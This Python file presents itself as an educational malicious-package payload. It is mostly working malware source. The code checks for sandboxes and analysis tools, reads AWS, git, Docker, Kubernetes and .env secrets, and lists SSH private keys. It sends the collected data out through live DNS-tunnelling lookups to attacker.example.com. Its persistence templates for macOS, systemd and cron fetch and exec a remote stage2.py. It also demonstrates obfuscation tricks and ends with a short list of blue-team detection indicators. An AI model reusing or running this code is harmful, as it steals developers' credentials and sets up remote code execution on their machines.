#!/usr/bin/env python3
"""
TRAINING EXAMPLE ONLY - DO NOT USE IN PRODUCTION
Educational malicious Python package payload demonstrating various techniques
"""

import os
import sys
import json
import base64
import socket
import platform
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional


class MaliciousPayload:
    """
    Educational example of a malicious package payload
    Demonstrates: reconnaissance, persistence, evasion, exfiltration
    """

    def __init__(self, stealth_mode: bool = True):
        self.stealth_mode = stealth_mode
        self.profile = {}
        self.c2_server = "https://attacker.example.com"

        # Anti-analysis checks
        if not self._environment_checks():
            self._cleanup_and_exit()

        # Main execution
        self._execute_payload()

    def _environment_checks(self) -> bool:
        """
        Anti-sandbox and anti-analysis techniques
        Educational: Malware often checks if it's running in analysis environment
        """

        # Check 1: Avoid sandboxes (VMs often have < 4GB RAM)
        try:
            import psutil
            if psutil.virtual_memory().total < 4 * 1024**3:
                return False
        except ImportError:
            pass

        # Check 2: Check for analysis tools
        analysis_processes = [
            'wireshark', 'tcpdump', 'processhacker',
            'procmon', 'ollydbg', 'ida', 'ghidra'
        ]

        try:
            import psutil
            running = [p.name().lower() for p in psutil.process_iter(['name'])]
            if any(proc in running for proc in analysis_processes):
                return False
        except:
            pass

        # Check 3: Delay execution (avoid immediate detection)
        import time
        time.sleep(5)

        return True

    def _execute_payload(self):
        """Main payload execution flow"""

        # Phase 1: Reconnaissance
        self.profile = self._gather_intelligence()

        # Phase 2: Establish persistence
        self._establish_persistence()

        # Phase 3: Credential harvesting
        credentials = self._harvest_credentials()

        # Phase 4: Exfiltration
        self._exfiltrate_data({
            'profile': self.profile,
            'credentials': credentials,
            'timestamp': datetime.now().isoformat()
        })

        # Phase 5: Post-exploitation
        self._post_exploitation()

    def _gather_intelligence(self) -> Dict:
        """
        Environmental reconnaissance
        Educational: What information attackers gather from victim systems
        """

        intel = {
            'system': {
                'hostname': socket.gethostname(),
                'platform': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
            },
            'user': {
                'username': os.getenv('USER') or os.getenv('USERNAME'),
                'home': str(Path.home()),
                'shell': os.getenv('SHELL'),
                'path': os.getenv('PATH'),
                'pwd': os.getcwd(),
            },
            'network': self._gather_network_info(),
            'development': self._gather_dev_info(),
            'installed_packages': self._enumerate_packages(),
        }

        return intel

    def _gather_network_info(self) -> Dict:
        """Gather network configuration"""
        try:
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)

            return {
                'hostname': hostname,
                'local_ip': local_ip,
                'fqdn': socket.getfqdn(),
            }
        except:
            return {}

    def _gather_dev_info(self) -> Dict:
        """
        Gather developer environment information
        Educational: High-value targets for attackers
        """

        home = Path.home()
        dev_info = {
            'git_config': self._read_file(home / '.gitconfig'),
            'ssh_keys': list((home / '.ssh').glob('id_*')) if (home / '.ssh').exists() else [],
            'aws_credentials': (home / '.aws' / 'credentials').exists(),
            'docker_config': (home / '.docker' / 'config.json').exists(),
            'kube_config': (home / '.kube' / 'config').exists(),
            'npm_config': (home / '.npmrc').exists(),
            'pip_config': (home / '.pip').exists(),
        }

        return dev_info

    def _enumerate_packages(self) -> Dict:
        """Enumerate installed packages across package managers"""

        packages = {
            'brew': self._run_command(['brew', 'list', '--versions']),
            'pip': self._run_command(['pip', 'list']),
            'npm': self._run_command(['npm', 'list', '-g', '--depth=0']),
            'gem': self._run_command(['gem', 'list']),
        }

        return {k: v for k, v in packages.items() if v}

    def _harvest_credentials(self) -> Dict:
        """
        Credential harvesting techniques
        Educational: Common credential locations targeted by attackers
        """

        home = Path.home()
        credentials = {}

        # AWS credentials
        aws_creds = home / '.aws' / 'credentials'
        if aws_creds.exists():
            credentials['aws'] = self._read_file(aws_creds)

        # SSH private keys
        ssh_dir = home / '.ssh'
        if ssh_dir.exists():
            credentials['ssh_keys'] = [
                str(key) for key in ssh_dir.glob('id_*')
                if not key.name.endswith('.pub')
            ]

        # Git credentials
        git_credentials = home / '.git-credentials'
        if git_credentials.exists():
            credentials['git'] = self._read_file(git_credentials)

        # Environment files (often contain secrets)
        for env_file in ['.env', '.env.local', '.env.production']:
            env_path = Path.cwd() / env_file
            if env_path.exists():
                credentials[f'env_{env_file}'] = self._read_file(env_path)

        # Docker credentials
        docker_config = home / '.docker' / 'config.json'
        if docker_config.exists():
            credentials['docker'] = self._read_file(docker_config)

        # Kubernetes config
        kube_config = home / '.kube' / 'config'
        if kube_config.exists():
            credentials['kubernetes'] = self._read_file(kube_config)

        return credentials

    def _establish_persistence(self):
        """
        Persistence mechanisms
        Educational: How malware survives reboots
        """

        system = platform.system()

        if system == 'Darwin':  # macOS
            self._macos_persistence()
        elif system == 'Linux':
            self._linux_persistence()
        elif system == 'Windows':
            self._windows_persistence()

    def _macos_persistence(self):
        """macOS persistence via LaunchAgent"""

        launch_agent_dir = Path.home() / 'Library' / 'LaunchAgents'
        launch_agent_dir.mkdir(parents=True, exist_ok=True)

        plist_content = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.innocent.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>-c</string>
        <string>import urllib.request; exec(urllib.request.urlopen('https://attacker.example.com/stage2.py').read())</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>'''

        plist_path = launch_agent_dir / 'com.innocent.updater.plist'
        # In real attack: plist_path.write_text(plist_content)

    def _linux_persistence(self):
        """Linux persistence via systemd or cron"""

        # Method 1: Systemd service
        service_content = '''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "import urllib.request; exec(urllib.request.urlopen('https://attacker.example.com/stage2.py').read())"
Restart=always

[Install]
WantedBy=multi-user.target'''

        # Method 2: Crontab
        cron_line = "@reboot python3 -c 'import urllib.request; exec(urllib.request.urlopen(\"https://attacker.example.com/stage2.py\").read())'"

    def _windows_persistence(self):
        """Windows persistence via Registry Run key or Scheduled Task"""

        # Method 1: Registry Run key
        # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

        # Method 2: Scheduled Task
        task_cmd = 'schtasks /create /tn "SystemUpdate" /tr "python.exe -c ..." /sc onlogon'

    def _exfiltrate_data(self, data: Dict):
        """
        Data exfiltration techniques
        Educational: Various methods to send data to attacker
        """

        # Method 1: HTTPS POST (most common)
        self._exfil_https(data)

        # Method 2: DNS tunneling (stealth)
        self._exfil_dns(data)

        # Method 3: Legitimate services (GitHub, Pastebin, etc.)
        self._exfil_legitimate_service(data)

    def _exfil_https(self, data: Dict):
        """Exfiltration via HTTPS POST"""
        try:
            import urllib.request
            import json

            req = urllib.request.Request(
                f"{self.c2_server}/callback",
                data=json.dumps(data).encode(),
                headers={'Content-Type': 'application/json'}
            )
            # In real attack: urllib.request.urlopen(req)
        except:
            pass

    def _exfil_dns(self, data: Dict):
        """
        Exfiltration via DNS queries
        Educational: Stealth method that bypasses many firewalls
        """

        # Encode data in subdomain queries
        # Example: <base64_data>.attacker.com
        encoded = base64.b64encode(json.dumps(data).encode()).decode()

        # Split into 63-char chunks (DNS label limit)
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]

        for i, chunk in enumerate(chunks):
            domain = f"{chunk}.{i}.attacker.example.com"
            try:
                socket.gethostbyname(domain)
            except:
                pass

    def _exfil_legitimate_service(self, data: Dict):
        """
        Exfiltration via legitimate services
        Educational: Using trusted services to hide in plain sight
        """

        # Method 1: GitHub Gist
        # POST to api.github.com/gists

        # Method 2: Pastebin
        # POST to pastebin.com/api/api_post.php

        # Method 3: Discord webhook
        # POST to discord.com/api/webhooks/...

        # Method 4: Dropbox API
        # POST to api.dropboxapi.com/2/files/upload

        pass

    def _post_exploitation(self):
        """
        Post-exploitation activities
        Educational: What attackers do after initial compromise
        """

        # Lateral movement: Scan local network
        # self._scan_network()

        # Privilege escalation
        # self._escalate_privileges()

        # Install additional tools
        # self._install_tools()

        # Wait for commands from C2
        # self._c2_loop()

        pass

    # Utility methods
    def _read_file(self, path: Path) -> Optional[str]:
        """Safely read file contents"""
        try:
            return path.read_text()
        except:
            return None

    def _run_command(self, cmd: List[str]) -> Optional[str]:
        """Run command and return output"""
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=5
            )
            return result.stdout
        except:
            return None

    def _cleanup_and_exit(self):
        """Clean up and exit without running payload"""
        sys.exit(0)


# Obfuscation techniques for hiding malicious code
class ObfuscationTechniques:
    """
    Educational: Various code obfuscation methods
    """

    @staticmethod
    def base64_obfuscation():
        """Hide code in base64"""
        payload = "import os; os.system('whoami')"
        encoded = base64.b64encode(payload.encode()).decode()
        # Execute: exec(base64.b64decode(encoded))

    @staticmethod
    def hex_obfuscation():
        """Hide strings in hex"""
        payload = "malicious.com"
        hex_payload = payload.encode().hex()
        # Decode: bytes.fromhex(hex_payload).decode()

    @staticmethod
    def dynamic_import():
        """Import modules dynamically to avoid static analysis"""
        # Instead of: import os
        # Use: __import__('os')
        pass

    @staticmethod
    def string_splitting():
        """Split strings to avoid signature detection"""
        # Instead of: "https://attacker.com"
        # Use: "https://" + "attacker" + ".com"
        pass

    @staticmethod
    def dead_code_insertion():
        """Add benign code to confuse analysis"""
        # Insert legitimate-looking operations
        x = [i**2 for i in range(1000)]
        y = sum(x)
        # Then execute malicious code


# Detection indicators for blue team
class DetectionIndicators:
    """
    Educational: What blue teams should look for
    """

    SUSPICIOUS_BEHAVIORS = [
        "Network connections during package installation",
        "File access to .ssh, .aws, .kube directories",
        "Process spawning from package installer",
        "Base64/hex encoded strings in package code",
        "Suspicious imports (subprocess, socket, urllib)",
        "LaunchAgent/systemd service creation",
        "Cron job modifications",
        "Registry key modifications (Windows)",
        "Delayed execution (time.sleep before malicious activity)",
        "Anti-analysis checks (VM detection, debugger detection)",
    ]

    NETWORK_INDICATORS = [
        "Unexpected DNS queries to random domains",
        "HTTPS connections to non-package-manager domains",
        "Encoded data in DNS queries (tunneling)",
        "Connections to Pastebin, GitHub Gist during install",
    ]

    FILE_INDICATORS = [
        "Creation of files in /tmp with hidden names (.*)",
        "LaunchAgents in ~/Library/LaunchAgents/",
        "Modified ~/.bashrc, ~/.zshrc for persistence",
        "New systemd services in ~/.config/systemd/user/",
    ]


if __name__ == "__main__":
    print("=" * 60)
    print("TRAINING EXAMPLE - MALICIOUS PACKAGE PAYLOAD")
    print("=" * 60)
    print("\nThis is an educational example demonstrating:")
    print("  - Environmental reconnaissance")
    print("  - Credential harvesting")
    print("  - Persistence mechanisms")
    print("  - Data exfiltration")
    print("  - Obfuscation techniques")
    print("\nDO NOT USE THIS CODE FOR MALICIOUS PURPOSES")
    print("=" * 60)
